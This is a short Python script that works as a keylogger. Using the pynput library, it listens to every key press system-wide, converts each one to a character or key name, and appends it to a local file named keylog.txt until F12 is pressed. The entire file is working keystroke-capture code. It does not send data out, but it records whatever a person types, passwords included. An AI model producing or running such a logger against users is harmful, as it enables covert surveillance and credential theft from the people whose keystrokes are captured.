from pynput import keyboard
from sys import exit

SHUTDOWN_KEY = "[F12]"
KEYLOG_FILENAME = "keylog.txt"

# Writes a key press to the keylog file
def write_key(key):
    letter = key2letter(key)

    with open(KEYLOG_FILENAME, "a+") as f:
        f.write(key2letter(key))

    if (letter == SHUTDOWN_KEY):
        exit()

# Converts key presses to letters or key names
def key2letter(key):
    if (hasattr(key, "char") and key.char != None):
        return str(key.char)
    elif (hasattr(key, "name")):
        return "[" + str(key.name).upper() + "]"
    elif (hasattr(key, "vk")):
        return "[" + str(key.vk) + "]"
    else:
        return "[?]"

# Listens for key presses
with keyboard.Listener(on_press=write_key) as lis: 
    lis.join()